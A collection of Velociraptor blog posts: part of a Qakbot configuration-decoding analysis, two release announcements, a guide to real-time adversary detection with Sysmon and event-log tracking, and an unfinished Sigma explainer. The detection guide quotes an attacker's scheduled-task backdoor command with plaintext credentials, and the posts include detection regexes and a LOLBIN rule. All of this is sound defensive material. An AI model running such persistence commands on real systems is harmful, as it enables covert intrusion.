SHA1 of the remaining decoded data
- Bytes `[20:40]` is the key used for the second round of decoding
- The Data to decode is byte `[40:]` onwards
- The same validation process occurs for the second round decoded data
    - `Verification = data[:20]`
    - `DecodedData = data[20:]`

![First round of Qakbot decode and verification](images/03decodehex.png)

Campaign information is located inside the smaller resource where,
after this decoding and verification process, data is clear text.

![Decoded campaign information](images/04campaign.png)

The larger resource stores Command and Control configuration. This is
typically stored in `netaddress format` with varying separators. A
common technique for finding the correct method is searching for common
ports and separator patterns in the decoded data.

![Easy to spot C2 patterns: port 443](images/05networkhex.png)



### Encoded strings

Qakbot stores blobs of xor encoded strings inside the .data section of
its payload binary. The current methodology is to extract blobs of key
and data from the referenced key offset which similarly is reused
across samples.

Current samples start at offset 0x50, with an xor key, followed by a
separator of 0x0000 before encoded data. In recent samples I have
observed more than one string blob and these have occurred in the same
format after the separator.

![Encoded strings .data](images/06hexstrings.png)

Next steps are splitting on separators, decode expected blob pairs and
drop any non printable. Results are fairly obvious when decoding is
successful as Qakbot produces clean strings. I typically have seen two
well defined groups with strings aligning to Qakbot capabilities.

![Decoded strings: RC4 key highlighted](images/07strings.png)



### Payload

Qakbot samples are typically packed and need execution or manual
unpacking to retrieve the payload for analysis. Its very difficult to
obtain this payload remotely at scale, in practice the easiest way is
to execute the sample in a VM or sandbox that enables extracting the
payload with correct PE offsets.

When executing locally Qakbot typically injects its payload into a
Windows process, and can be detected with yara targeting the process
for an unbacked section with `PAGE_EXECUTE_READWRITE` protections.

Below is an example of running PE-Sieve / Hollows Hunter tool
from Hasherezade. This helpful tool enables detection of several types
of process injection, and the dumping of injected sections with
appropriately aligned headers. In this case, the injected process is
`wermgr.exe` but it's worth to note, depending on variant and process
footprint, your injected process may vary.

![Dumping Qakbot payload using pe-sieve](images/08pe-sieve.png)



### Doing it at scale

Now I have explained the decode process, time to enable both detection
and decode automation in Velociraptor.

I have recently released
[Windows.Carving.Qakbot](https://docs.velociraptor.app/exchange/artifacts/pages/qakbot/)
which leverages a PE dump capability in Velociraptor 0.6.8 to enable
live memory analysis. The goal of the artifact was to automate my
decoding workflow for a generic Qakbot parser and save time for a
common analysis. I also wanted an easy to update parser to add
additional keys or decode nuances when changes are discovered.

![Windows.Carving.Qakbot: parameters](images/09parameters.png)

This artifact uses Yara to detect an injected Qakbot payload, then
attempts to parse the payload configuration and strings. Some of the
features in the artifact cover changes observed in the past in the
decryption process to allow a simplified extraction workflow:

- Automatic PE extraction and offset alignment for memory detections.
- `StringOffset` - the offset of the string xor key and encoded strings
is reused regularly.
- PE resource type: the RC4 encoded configuration is typically inside
2 resources, I’ve observed `BITMAP` and `RCDATA`
- Unescaped key string: this field is typically reused over samples.
- Type of encoding: single or double, double being the more recent.
- Hidden `TargetBytes` parameter to enable piping payload in for
analysis.
- Worker threads: for bulk analysis / research use cases.

![Windows.Carving.Qakbot: live decode](images/10decode.png)



### Research

The Qakbot parser can also be leveraged for research and run bulk
analysis. One caveat is the content requires payload files that have
been dumped with offsets intact. This typically requires some post
collection filtering or PE offset realignment but enables Velociraptor
notebook to manipulate post processed data.

Some techniques I have used to bulk collect samples:
- Sandbox with PE dumping features: api based collection
- Virustotal search: `crowdsourced_yara_rule:0083a00b09|win_qakbot_auto`
AND `tag:pedll` AND NOT `tag:corrupt`
(note: this will collect some broken
payloads)

![Bulk collection: IPs seen across multiple campaign names and ports](images/11research_ip.png)

Some findings from a small data set ~60 samples:
- Named campaigns are typically short and not longer than a few
samples over a few days.
- IP addresses are regularly reused and shared across campaigns
- Most prevalent campaigns are `BB` and  `obama` prefixed
- Minor campaigns observed: `azd`, `tok` and `rds` with only one or
two observed payload samples each.

Strings analysis can also provide insights to sample behavior over
time to assist analysis. A great example is the adding to process name
list for anti-analysis checks.

![Bulk collection: Strings highlighting anti-analysis check additions over time](images/11research_strings.png)



### Conclusion

During this post I have explained the Qakbot decoding process and
introduced an exciting new feature in Velociraptor. PE dumping is a
useful capability and enables advanced capability at enterprise scale,
not even available in expensive paid tools. For widespread threats
like Qakbot, this kind of content can significantly improve response
for the blue team, or even provide insights into threats when analyzed
in bulk. In the coming months the Velociraptor team will be publishing
a series of similar blog posts, offering a sneak peek at some of the
types of memory analysis enabled by Velociraptor and incorporated into
our training courses.

I also would like to thank some of Rapid7’s great analysts - `Jakob Denlinger`
and `James Dunne` for bouncing some ideas when writing this
post.



### References

1. [Malpedia, Qakbot](https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot)
2. [Elastic, QBOT Malware Analysis](https://www.elastic.co/security-labs/qbot-malware-analysis)
3. [Hasherezade, Hollows Hunter](https://github.com/hasherezade/hollows_hunter)
4. [Windows.Carving.Qakbot](https://docs.velociraptor.app/exchange/artifacts/pages/qakbot/)

---END OF FILE---

======
FILE: /content/blog/2023/2023-07-27-release-notes-0.7.0/_index.md
======
---
title: "Velociraptor 0.7.0 Release"
description: |
   Velociraptor Release 0.7.0 is now released
   This post discusses some of the new features.

tags:
 - Release

author: "Mike Cohen"
date: 2023-07-27
---

I am very excited to announce the latest Velociraptor release 0.7.0 is
now released.

In this post I will discuss some of the interesting new features.

## GUI improvements

The GUI was updated in this release to improve user workflow and accessibility.

### Enhanced client search

In previous versions client information was written to the datastore
in individual files (one file per client record). This works ok as
long as the number of clients is not too large and the filesystem is
fast. As users are now deploying Velociraptor with larger deployment
sizes we were seeing some slow downs when the number of clients
exceeded 50k.

In this release the client index was rewritten to store all client
records in a single snapshot file, while managing this file in
memory. This approach allows client searching to be extremely quick
even for large numbers of clients well over 100k.

Additionally we are now able to display the total number of hits in
each search giving a more comprehensive indication of the total number
of clients.

![](client_search.png)


### Paged table in Flows List

Velociraptor's collections view shows the list of collections from the
endpoint (or the server). Previously the GUI limited this view to 100
previous collections. This means that for heavily collected clients
it was impossible to view older collections (without custom VQL).

In this release the GUI was updated to include a paged table (with
suitable filtering and sorting capabilities) so all collections can be
accessed.


## VQL Plugins and artifacts


### Chrome artifacts

Added a leveldb parser and artifacts around Chrome Session
Storage. This allows to analyse data that is stored by Chrome locally
by various web apps.

### Lnk forensics

This release added a more comprehensive Lnk parser covering off on all
known Lnk file features.  You can access the Lnk file analysis using
the `Windows.Forensics.Lnk artifact.

### Direct S3 accessor

Velociraptor's accessors provide a way to apply the many plugins that
operate on files to other domains. In particular the glob() plugin
allows searching the accessors for filename patterns.

In this release Velociraptor adds an S3 accessor. This allows plugins
to directly operate on S3 buckets. In particular the glob() plugin can
be used to query bucket contents and read files from various
buckets. This capability opens the door for sophisticated automation
around S3 buckets.

### Volume Shadow Copies analysis

Window's Volume Shadow Service (VSS) creates a snapshot of the drive at
a point in time. Forensically, this is sometimes very helpful as it
captures a point in time view of the previous disk state (If the VSS
are still around when we perform our analysis).

Velociraptor provides access to the different VSS volumes via the
`ntfs` accessor, and many artifacts previously provided the ability to
report files that differed between VSS snapshots.

In the 0.7.0 release, Velociraptor adds the `ntfs_vss` accessor. This
accessor automatically considers different snapshots and deduplicates
files that are identical in different snapshots. This makes it much
easier to incorporate VSS analysis into your artifacts.

### The SQLiteHunter project

Many artifacts consist of parsing SQLite files. For example major
browsers use SQLite files heavily.

This release incorporates the SQLiteHunter artifact. A one stop shop
for finding and analyzing SQLite files such as browser artifacts and
OS internal files. Although the project started with SQLite files, it
now automates a lot of artifacts such as `WebCacheV01` parsing and the
Windows Search Service - aka `Windows.edb` (which are `ESE` based
parsers).

This one artifact combines and obsoletes many distinct older
artifacts.

More info at https://github.com/Velocidex/SQLiteHunter

### Glob plugin improvements

The `glob()` plugin is probably the most used plugin in VQL, as it
allows for the efficient search of filenames in the filesystem. While
the glob() plugin can accept a list of glob expressions so the
filesystem walk can be optimized as much as possible, it was
previously difficult to know why a particular reported file was
chosen.

In this release, the glob plugin reports the list of glob expressions
that caused the match to be reported. This allows callers to more
easily combine several file searches into the same plugin call.

### URL style paths

In very old versions of Velociraptor nested paths could be represented
as URL objects. Until now a backwards compatible layer was used to
continue supporting this behavior. In the latest release URL style
paths are no longer supported - use the `pathspec()` function to build
proper `OSPath` objects.

## Server improvements

Velociraptor offers automatic use of let's encrypt
certificates. However, Let's encrypt can only issue certificates for
port 443. This means that the frontend service (which is used to
communicate with clients) has to share the same port as the GUI port
(which is used to serve the GUI application). This makes it hard to
create firewall rules to filter access to the frontend and not to the
GUI when used in this configuration.

In the 0.7.0 release, Velociraptor offers the `GUI.allowed_cidr`
option. If specified, the list of CIDR addresses will specify the
source IP acceptable to the server for connections to the GUI
application (for example `192.168.1.0/24`).

This filtering only applies to the GUI and forms an additional layer
of security protecting the GUI application (in addition to the usual
authentication methods).

### Better handling of out of disk errors

Velociraptor can collect data very quickly and sometimes this can
results in a full disk. Previously a full disk error could cause file
corruption and data loss. In this release the server monitors its free
disk level and disables file writing when the disk is too full. This
avoids data corruption when the disk fills up. When space is freed the
server will automatically start writing again.

## The offline collector

The offline collected is a pre-configured binary which can be used to
automatically collect any artifacts into a ZIP file and optionally
upload the file to a remote system like a cloud bucket or SMB share.

Previously, Velociraptor would embed the configuration file into the
binary so it only needed to be executed (e.g. double clicked). While
this method is still supported on Windows, it turned out that on MacOS
this is no longer supported as binaries can not be modified after
build. Even on Windows, embedding the configuration will invalidate
the signature.

In this release a new type of collector is available `Generic`

![](generic_collector.png)

This will embed the configuration into a shell script instead of the
Velociraptor binary. Users can then launch the offline collector using
the unmodified official binary by specifying the `--embedded_config`
flag:

```
velociraptor-v0.7.0-windows-amd64.exe -- --embedded_config Collector_velociraptor-collector
```

![](generic_collector_running.png)

While the method is required for MacOS, it can also be used for
Windows in order to preserve the binary signature.

## Conclusions

There are many more new features and bug fixes in the latest
release.

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2023/2023-01-13-tracking-an-adversary-in-realtime/_index.md
======
---
title: "Tracking an adversary in real-time using Velociraptor"
description: |
   This blog explains how you can use Velociraptor to enable real-time monitoring.
author: "Jos Clephas - @DfirJos"
date: 2023-01-09
---

As an incident responder that is fighting an adversary, you typically
want to be alerted the moment they conduct hands-on-keyboard activity
on systems of the IT-infrastructure that you are investigating. This
blog post shows you two practical examples on how to achieve this with
Velociraptor.

While detection is not the most typical use-case of Velociraptor, it
can be used for that. And to me it has proven to be valuable during
engagements when the deployed Endpoint Detection and Response (EDR)
solution lacked certain detection capabilities, or when it was not
deployed.

## Example 1: Track commands

Adversaries often use commands to conduct their malicious
activity. Receiving an alert when these commands are launched is very
valuable as it allows you to respond quickly.

Let's say you observed that the adversary planted a backdoor on a
remote system using the following scheduled task command:

```
schtasks /Create /SC minute /mo 5 /TN WindowsUpdateCheck /TR C:/Perflog/m.exe" /ru system /s srv_dc01 /u adm_peter /p adminpw
```

Using Velociraptor in combination with the system monitoring tool
'Sysmon' you’re able to build detection. There is no need to manually
install Sysmon, if you follow the steps below it will do it for you.

1. Open the GUI of the Velociraptor server.
2. Select a random client.

![](images/4.png)

2.  Go the ‘Client Events’ menu and choose 'Update the client monitoring table'.

![](images/1.png)

3. Select the label group, and go to the next window ‘Select
   Artifacts’

4. Select the artifact `Windows.Detection.ProcessCreation`. Optional:
   if you want to deploy a custom Sysmon config choose `SysmonConfig`
   and select it. By default, it selects this config:
   https://github.com/SwiftOnSecurity/sysmon-config

![](images/12.png)

5.  Adjust the parameters. Below I provided an example of how to
    detect the scheduled task command.

![](images/2.png)

The regex I used matches specific parameters in the scheduled task
command.

```
(?:(\/ru)|(\/p)|(\/s))
```

And the advantage of starting the regex with `(?:` and combining it
with capture groups `()` with pipes `|` between them, is that the
order does not matter. Meaning that even if the adversary shifts some
parameters in the command, the detection still works.

Another way that I used to make it a bit harder for the adversary to
evade detection, is to filter on the PE Original FileName instead of
the Image name. This way detection still works even if the adversary
changes the filename of the binary (in the figure above you see that
`lolbin.exe` was renamed from `schtasks.exe`). Note that detecting on the
PE Original Filename will not work anymore if the adversary modified
the PE header and changed the original filename - which can be done
with a HEX editor, for example.

### Why Sysmon?

The artifact shown in this example installs `Sysmon`. The reason I
used Sysmon is that it logs process creation events without failing,
even when it is a short-lived process. Missed events result in
unreliable detection.

An alternative to Sysmon was consuming process-related events directly
from Event Tracing for Windows (ETW). ETW is a mechanism that
Microsoft built for troubleshooting and diagnostics, and it provides
an enormous amount of events generated by the OS. The process-related
events are generated by the ETW provider
`Microsoft-Windows-Kernel-Process` that has the guid
`{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}`. My testing with this
provider resulted in a lot of missed events by Velociraptor (possibly
due to the high-volume). And also, short-lived processes could not be
enriched with commandline parameters. That is because these parameters
are not provided by ETW, and enriching with the process running in
memory sometimes fails as it is shutdown too early.

For example, running the following command that lists content of a
remote drive `dir \\10.96.20.20\c$` sometimes only logs `dir` because
enriching failed. And therefore your detection would not work if you
attempt to match on commandline. Which is something you would want in
this case, because matching on only `dir` would undoubtedly result in
too many false-positives.

Because I wanted reliable detection I chose Sysmon instead of directly
consuming the process events from the aforementioned ETW provider.


## Example 2: Track compromised accounts

The Windows Event Log is a great log source that enables you to track
adversary activity in real-time. Due to the Event Log tracker of
Velociraptor, you can easily monitor for new entries.

Let’s say the adversary uses the Windows accounts `adm_peter` and
`svc_iis` to move laterally through the IT-infrastructure, you can
monitor for any activity concerning these accounts using the artifact
`Windows.Events.Trackaccount`.

To configure this using the GUI of the Velociraptor server, go to:

1. Select a random client:

![](images/4.png)

2. Go to ‘Client Events’ in the menu
3. Choose ‘Update client monitoring table’

![](images/5.png)

3.  Select the `Label group` and go to the next window.
4.  Select the artifact `Windows.Events.Trackaccount`.
5.  Configure the artifact parameters. In the example below it logs
    authentication events (Windows Event ID ‘4624’) concerning the
    accounts `adm_peter` and `svc_iis`. You are also able to specify
    the `LogonType` (3 = network logon, 10 = interactive logon, etc).

![](images/6.png)

### Monitor vs contain

When reading the above example you might have thought: "why should I
monitor a compromised account when I can disable it?" There are valid
reasons why in some cases you first want to monitor for a while. For
example, when you disable only one account, and the adversary also
compromised other accounts, you did not stop or slow down the
adversary. And you likely only alerted them that you are after their
tail. Which is something you want to avoid, as the adversary might
change tactics which makes it harder for you to track hem.

Another reason why it sometimes makes sense to leave the account
active, is to monitor it with the goal in mind to learn about the
Tools, Tactics, and Procedures (TTP) of the adversary. This in turn
can be used to strengthen the organization their defenses to prevent
similar incidents from occurring again in the future.

There are also valid reasons why you would want to disable compromised
accounts immediately instead of monitoring for a while. For example,
when it actually slow down or stop the adversary, or when it is the
policy of the organization.

Even better containment tactics to stop the adversary, are listed
below. These are particularly helpful when the extend of the
compromise is not yet clear.

- Block or limit outbound network-communication. If done correctly
  this will prevent active command & control (C&C) channels.
- Block DNS requests to external servers as DNS can tunnel C&C
  traffic.
- Block or limit inbound network-communication. As the adversary could
  have placed web-shells on web servers, or compromised other potential
  entry points.

It is important to have a discussion of the above with the
client. They typically want to balance the potential risk of the
compromise against the operational impact. In the end they are the
ones who need to make that decision.

At some point in the investigation you definitely want to disable all
compromised accounts or reset passwords. The same applies to all other
remediation activities aimed at kicking the adversary out, such as
blocking malicious IP addresses, blackholing malicious domains,
quarantining compromised systems, resetting passwords, etc. The most
effective time to execute these activities is when there is a thorough
understanding of the extent of the compromise. This is referred to by
`Mandiant` as the Strike Zone.

![](images/11.png)

Striking too soon may result in re-doing the remediation
activities. Striking too late may result in the adversary achieving
their mission. Finding the sweet spot is important, and for me that is
when I don't find any new evidence and when I feel comfortable in
knowing we have enough measures in place to respond effectively when
the adversary comes back.

## Sending alerts

When you want to send an alert the moment a detection took place,
follow the steps below. This enables the server-side artifacts that
monitor for triggered alerts.

In the below example I used Teams to receive the alerts, but any other
communication platform that supports Webhooks would work.

1.  Go to Server Events and update the server monitoring table

![](images/7.png)

2.  Select the artifact ‘Server.Alerts.ProcessCreation’ and/or
    `Server.Alerts.Trackaccount` and go to the next window ‘Configure
    Parameters’.

![](images/8.png)

3.  Create a webhook and enter the URL as a parameter. They are easy
    to obtain, a quick procedure for Microsoft Teams can be found
    *[here](https://learn.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/add-incoming-webhook)*. Webhooks
    for other platforms can also be created, such as for Slack,
    Discord, and others.

4.  If all works well, you should receive an alert in your
    communication platform when an alert is triggered.

![](images/9.png)


## Creating an overview of alerts

Besides sending alerts, it is also handy to create an overview in
Velociraptor with all alerts. With the Notebook capability you can
create this. One requirement is that the server-side artifacts needs
to be created by following the steps in the previous paragraph.

![](images/10.png)

The VQL query below is what you can enter in a Notebook to create an
overview of the alerts.


```vql
SELECT EventData.UtcTime as UtcTime,
       EventData.CommandLine as CommandLine,
       Hostname, ClientId
FROM source(artifact='Server.Alerts.ProcessCreation')
```

If you want to list the alerts of the artifact
`Windows.Events.Trackaccount` you need to make some slight changes to
the VQL query, such as changing the artifact name and the selected
fields.

## Test. Test. Test.

Always test the detections you put in place. The way I typically test
with Velociraptor is by mimicking the adversary activity on a test
system that is connected to the Velociraptor server. For example, I
launch a command that the adversary used and I check to see if that
results in an alert. Another possibility is launching [remote shell
commands](https://docs.velociraptor.app/docs/gui/clients/#remote-shell-commands)
via Velociraptor.


## What more can be done?

The sky is the limit when it comes to detecting the adversary using
Velociraptor. And there are still opportunities for building
artifacts:

- Registry changes (for example when persistence of malware is
  created)
- Detect process injection
- Named pipes detection

Below is a list of artifacts that are already built:

-   File changes (`Windows.Detection.Usn`)
-   DNS request monitoring (for clients: `Windows.ETW.DNS`, and for
    servers: `Windows.ETW.DNSQueriesServer`)
-   Service creation (`Windows.Events.ServiceCreation`)
-   PsExec usage (`Windows.Detection.PsexecService`)
-   WMI process creation events (`Windows.ETW.WMIProcessCreate`)

If you have any other ideas for detection feel free to share!

---END OF FILE---

======
FILE: /content/blog/2023/2023-02-13-release-notes-0.6.8/_index.md
======
---
title: "Velociraptor 0.6.8 Release"
description: |
   Velociraptor Release 0.6.8 is now LIVE.
   This post discusses some of the new features.

tags:
 - Release
author: "Mike Cohen"
date: 2023-02-13
---

I am very excited to announce the latest Velociraptor release 0.6.8 is
now live. This release has been in the making for a
few months now and has a lot of new features and bug fixes.

In this post I will discuss some of the interesting new features.

## Performance improvements

A big theme in the 0.6.8 release was about performance improvement,
making Velociraptor faster, more efficient and more scalable (even
more so than it currently is!).

### New client-server communication protocol

When collecting artifacts from endpoints we need to maintain a
collection state (e.g. how many bytes were transferred?, how many rows?
was the collection successful? etc). Previously tracking the
collection was the task of the server, but this extra processing on
the server limited the total number of collections the server could
process.

In the 0.6.8 release a new communication protocol was added to offload
a lot of the collection tracking to the client itself. This lowers the
amount of work on the server and therefore allows more collections to
be processed by the server at the same time.

{{% notice tip "Support for older clients" %}}

To maintain support with older clients, the server continues to use
the older communication protocol with them - but will achieve the most
improvement in performance once the newer clients are deployed.

{{% /notice %}}

### New Virtual File System GUI

The VFS feature in Velociraptor allows users to interactively inspect
directories and files on the endpoint, in an familiar tree user
interface. The previous VFS view would store the entire directory
listing in a single table for each directory. For very large
directories like `C:\Windows` or `C:\Windows\System32` (which
typically have thousands of files) this would strain the browser
leading to unusable UI.

In the latest release, the VFS GUI uses the familiar paged table and
syncs this directory listing in a more efficient way. This improves
performance significantly: for example, it is now possible and
reasonable to perform a recursive directory sync on `C:\Windows`, on
my system syncs over 250k files in less than 90 seconds.

![Inspecting a large directory is faster with paging tables.](vfs_system32.png)

Since the VFS is now using the familiar paging table UI, it is also
possible to filter, sort on any column using the same familiar UI.

### Faster export functionality

Velociraptor hunts and collections can be exported to a ZIP file for
easy consumption in other tools. The 0.6.8 release improved the export
code to make it much faster. Additionally the GUI was improved to show
how many files were exported into the zip, and other statistics.

![Exporting collections is much faster!](export_collection.png)


### Tracing capability on client collections

We often get questions about what happened to a collection that seems
to be hung? It is difficult to know why a collection seems to be
unresponsive or stopped - it could mean the client was killed for some
reason, (e.g. due to excessive memory use or a timeout).

Previously the only way to gather client side information was to
collect a `Generic.Client.Profile` collection. This required running
it at just the right time and did not guarantee that we would get
helpful insight of what the query and the client binary were doing
during the operation in question.

In the latest release it is possible to specify a trace on any
collection to automatically collect client side state as the
collection is progressing.

![Enabling trace on every collection increases visibility](trace.png)

![Trace files contain debugging information](trace_2.png)


## VQL improvement - disk based materialize operator

The VQL `LET ... <= ` operator is called the [materializing LET
operator]({{% ref "/docs/vql/#materialized-let-expressions" %}})
because it expands the following query into a memory array which can
be accessed cheaply multiple times.

While this is useful for small queries, it has proved dangerous in
some cases, because users inadvertently attempted to materialize a
very large query (e.g. a large `glob()` operation) dramatically
increasing memory use. For example, the following query could cause
problems in earlier versions.

```vql
LET X <= SELECT * FROM glob(globs=specs.Glob, accessor=Accessor)
```

In the latest release the VQL engine was improved to support a temp
file based materialized operator. If the materialized query exceeds a
reasonable level (by default 1000 rows), the engine will automatically
switch away from memory based storage into file backed
storage. Although file based storage is slower, memory usage is more
controlled.

Ideally the VQL is rewritten to avoid this type of operation, but
sometimes it is unavoidable, and in this case, file based materialize
operations are essential to maintain stability and acceptable memory
consumption.

## New MSI deployment option

On Windows the recommended way to install Velociraptor is via an MSI
package. The MSI package allows the software to be properly installed
and uninstalled and it is also compatible with standard Windows
software management procedures.

Previously however, building the MSI requires using the WIX toolkit -
a Windows only MSI builder which is difficult to run on other
platforms. Operationally building with WIX complicates deployment
procedures and requires using a complex release platform.

In the 0.6.8 release, a new method for `repacking` the official MSI
package is now recommended. This can be done on any operating system
and does not require WIX installed. Simply embed the client
configuration file in the officially distributed MSI packages using
the following command:

```
velociraptor-v0.6.8-rc1-linux-amd64 config repack --exe velociraptor-v0.6.8-rc1-windows-amd64.msi client.config.yaml output.msi
```

![Repacking an MSI for windows distribution](repacking.png)

## Conclusions

There are many more new features and bug fixes in the latest
release. Currently the release is in testing for the next few weeks,
so please test widely and provide feedback by opening GitHub issues.

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2023/2023-11-15-sigma_in_velociraptor/_index.md
======
---
title: "Sigma In Velociraptor"
date: 2023-10-15T00:14:44+10:00
tags:
- Sigma
- Detection
---

This page discusses how Sigma is implemented and used within
Velociraptor.


## What is Sigma?

Detection engineering is an evolving field with many practitioners
developing and evolving signatures rapidly, as new threats emerge and
better detection capabilities are introduced. However, much of the
time the specifics of how to write detection rules depend on the
underlying software and detection engine. For example, a particular
detection rule written to work on Elastic based SIEM is not easy to
port to a different platform (e.g. Splunk).

Sigma is an attempt to abstract away the specifics of the detection
engine into a generic high level signature description. The `Sigma
Rule`, theoretically, does not target a specific detection product,
but instead described high level concepts like process execution,
registry access etc.

By providing a high level taxonomy for practitioners, detection rules
can be exchanged with others in the community, even people using
different backend detection engines.

Traditionally, a Sigma rule is not directly usable by many backend
detection engines. Instead a `Sigma Compiler` transforms the Sigma
rule to a specific query in the backend's native query language. For
example a Sigma rule may be "compiled" into an Elastic Query, or
Splunk Query as needed.

While the full details of Sigma are described in the Main Sigma page
https://sigmahq.io/ , in this post we will discuss as a high level
those aspects of Sigma directly relevant to the Velociraptor
implementation.

## How is Sigma used traditionally?

Sigma was designed to write detection rules for traditional SIEM based
detection engines.

![Traditional SIEM workflow](traditional_siem.png)

Such a system is shown above:

1. Log Sources like event logs are collected by an endpoint agent
2. Events are forwarded over the network to a SIEM or central data lake solution.
3. Sigma Rules are compiled into native queries against the SIEM solution
4. The SIEM or data lake implementation uncovers detections based on this query.

In practice, each SIEM product has a unique way of normalizing the
available data to fit within their own database schema. For example
the Elastic ecosystem uses the [Elastic Common Schema
(ECS)](https://www.elastic.co/guide/en/ecs/current/index.html). The
ECS schema converts from certain fields in the original event log file
to different field names within the ECS - for example the field
`System.TimeCreated.SystemTime` in the event log file is translated to
the field `@timestamp` by the Elastic agent for storage in the database.

{{% notice "warning" %}}

It is often hard to know exactly what the translation is supposed to
be because vendors attempt to normalize many different log sources to
the same schema. In the case of ECS the [reference
documentation](https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html)
is incredibly vague and we need to resort to reading the code to
figure out the exact field mappings to understand exactly where each
field is gathered from. Additionally, this translation is not always a
simple renaming, but sometimes involves a non-trivial transformation
by the Elastic agent which is not always well documented.

{{% /notice %}}

## The Sigma rule

Sigma is designed to be a high level abstracted notation that can
cater for the differences between the backends. This is achieved by
defining yet another layer of abstraction over the original
events. Consider the following reduced Sigma rule ([The full rule here](https://github.com/Yamato-Security/hayabusa-rules/blob/main/sigma/builtin/taskscheduler/win_taskscheduler_lolbin_execution_via_task_scheduler.yml)):

```yaml
title: Scheduled Task Executed Uncommon LOLBIN
logsource:
    product: windows
    service: taskscheduler
detection:
    taskscheduler:
        Channel: Microsoft-Windows-TaskScheduler/Operational
    selection:
        EventID: 129
        Path|endswith:
            - \calc.exe
            - \cscript.exe
            - \mshta.exe
            - \mspaint.exe
            - \notepad.exe
            - \regsvr32.exe
            - \wscript.exe
    condition: taskscheduler and selection
```

Above we only included limited fields for the purpose of this discussion.

The rule triggers when the `TaskScheduler` event log file contains an
event id 129 [Task Scheduler launched
task](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc774964(v=ws.10))
and the process launched ends with one of the executables listed.

To actually match this rule, The Sigma compiler needs to perform two
mappings:

1. The `logsource` is ultimately mapped to the
   `C:/Windows/System32/WinEvt/Logs/Microsoft-Windows-TaskScheduler%4Operational.evtx`
   event log file or whatever table the backend SIEM uses to
   collect/store these events.
2. Each field referenced in the Sigma rule needs to be mapped to the
   field in the actual event. For example in this case the field
   `Path` needs to be translated to the field `EventData.Path` within
   the original event log, or whatever the specific SIEM uses to
   normalize that original field into its own database schema.

### Limitations of the Sigma format

By introducing yet another layer of abstraction over the original
event logs, the analyst needs to learn another taxonomy to reference
the underlying data they are interested in. For example, in the above
rule, the analyst wants to detect events found in the specific log
file on the endpoint, but needs to know that Sigma uses the
`logsource` specification with `product=windows,
service=taskscheduler` to actually refer to that file.

In real life, there is a natural trade off between forwarding more
events from the system (increasing detection capabilities) at the cost
of more network transmission, storage requirement and scaling the
backend database to handle the larger data sizes.

Typically this means that not **all** event logs are forwarded off the
machine, only those that are considered relevant or important are
forwarded. The exact choice of which event logs to forward depends on
both the choice of SIEM vendor and the specific configuration of the
SIEM involved.

For example, while there are a number of officially recognized [log
sources](https://sigmahq.io/docs/basics/log-sources.html) there is no
guarantee that the underlying SIEM actually forwards any of these
logs, and just like in the ECS example given above, there is no
directly documented mapping between the abstract log sources and the
actual files on disk.

To actually use the Sigma rule, we need to provide both the log source
mapping and field mapping to the sigma compiler.  Sigma is not
actually its own matching engine, but simply a translation layer
between an abstract format and the backend SIEM.

Sigma provides a set of compiler modules and field translations for a
number of popular backend SIEMs with varying capabilities and internal
schemas.

In practice, The Sigma rules need to be written with the target SIEM
solution in mind, as well as the specific configuration of the entire
system. For example, if a SIEM rule is written to use the [Sysmon
registry events (event ID
12,13,14)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
there is no guarantee that these events are actually forwarded from
the endpoint into the SIEM (that depends on collection
considerations), or that the target SIEM even supports these event
types at all.

As an analyst writing Sigma rules, the additional layer of abstraction
might seem pointless - they need to think of their rule in a different
abstract terms to the SIEM that will actually be running these rules,
but at the same time need to know exactly what backend query will be
produced and if this query is even supported on their particular
SIEM. It is very easy to write a rule that simply will not work on
their particular backend SIEM because it uses some feature, log source
or event field that is simply not available.

### Advantages of Sigma

Despite these practical limitations, Sigma has grown in popularity in
recent years because it allows for easy exchange of detection rules
between users of different SIEM backends.

While not perfect, there is a reasonable chance that a Sigma rule
written with one backend SIEM in mind will also work on another,
providing it uses fairly common log sources and commonly collected
event types, and does not use too complicated operators.  This allows
Sigma to be an attractive choice for writing and developing detection
rules, especially for users who need to switch between many backend
systems all the time.


## How is Sigma implemented in Velociraptor?

Velociraptor is not a traditional SIEM and does not rely on a scalable
large backend data mining engine for querying collected data. Instead,
Velociraptor's power lies in its [Velociraptor Query
Language](https://docs.velociraptor.app/docs/vql/) which allows the
endpoint agent itself to query data directly on the endpoint.

This means that Velociraptor has access to all information available
on the endpoint without needing to rely on specific log forwarding
configuration. Instead, queries are run directly on the endpoint and
only matching events are forwarded to the server. This minimizes the
total amount of data that needs to be managed by the server to only
high value, relevant events that already match the Sigma rules.

![Velociraptor Sigma Workflow](velociraptor_sigma_flow.svg)

The above figure outlines the Velociraptor Sigma workflow:

1. Sigma rules are synced to the endpoint via a Standard Velociraptor
   Collection and are applied to an internal Sigma rule matching
   engine.
2. The engine determines which log sources will be used based on the
   actual rule requirement. Parsing additional log sources is easy to
   implement via a VQL query.
3. Events are collected from the relevant local log sources (e.g. by
   parsing the relevant EVTX files) and are compared efficiently
   against the set of Sigma rules target each log source.
4. Only matches are forwarded to the cloud (tagged by the Sigma rules
   by severity levels - e.g. Critical, High, Medium)
5. The Velociraptor server only deals with high value events by
   writing to local storage or forwarding to a SIEM for
   alerting/escalation.

In this arrangement, the event volumes sent to the server are very
small because only post-filtered events are handled.

### The Sigma Velociraptor plugin

As explained above, Sigma is an abstract format which requires
implementations to provide a mapping between `log sources` and actual
concrete implementations of these sources. Before we can match any
Sigma rules in Velociraptor we need to teach Velociraptor how to map
between the log sources mentioned in a Sigma rule and a real VQL query
that will provide events from that source.

